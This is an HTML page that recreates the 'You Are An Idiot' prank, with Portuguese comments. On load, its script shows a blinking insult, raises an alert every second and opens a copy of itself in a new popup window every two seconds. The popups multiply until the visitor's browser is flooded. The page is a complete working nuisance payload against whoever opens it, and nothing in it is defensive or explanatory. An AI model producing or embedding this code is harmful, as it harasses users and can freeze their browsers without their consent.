<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You Are An Idiot</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 20%;
        }
        .blink {
            font-size: 3em;
            animation: blink-animation 1s steps(2, start) infinite;
        }
        @keyframes blink-animation {
            to {
                visibility: hidden;
            }
        }
    </style>
</head>
<body>
    <h1 class="blink">YOU ARE AN IDIOT!</h1>
    <script>
        function showAlert() {
            alert("YOU ARE AN IDIOT!");
        }

        // Exibe vários alerts e cria um loop infinito
        function startMadness() {
            setInterval(() => {
                showAlert();
            }, 1000);
        }

        // Começa a loucura quando a página é carregada
        window.onload = function() {
            startMadness();
        };

        // Abre janelas pop-up repetidamente
        function openPopups() {
            setInterval(() => {
                window.open(window.location.href, "_blank", "width=200,height=100");
            }, 2000);
        }

        // Inicia as pop-ups quando a página é carregada
        openPopups();
    </script>
</body>
</html>
